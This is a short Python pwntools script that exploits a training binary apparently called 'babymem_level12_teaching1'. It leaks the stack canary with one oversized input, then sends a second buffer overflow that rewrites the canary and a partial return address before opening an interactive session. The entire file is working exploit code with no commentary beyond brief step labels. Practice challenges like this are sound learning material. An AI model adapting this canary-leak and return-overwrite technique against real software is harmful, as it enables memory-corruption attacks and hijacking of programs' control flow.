#!/usr/bin/env python3

from pwn import *

# Create a process
p = process('/babymem_level12_teaching1')

# Send payload size
p.sendline(b"89")

# Send payload
p.send(b"REPEAT" + b"a" * 83)

# Retrieve stack canary
stack_canary = int.from_bytes(p.recvline_startswith(b"You said: ")[99:106], "little")
print(hex(stack_canary))

# Re-enter function again
# Send payload size
p.sendline(b"106")

# Send payload
p.send(b"a" * 88 + p64(stack_canary * 256) + b"a" * 8 + p16(0x19fd))
p.interactive()
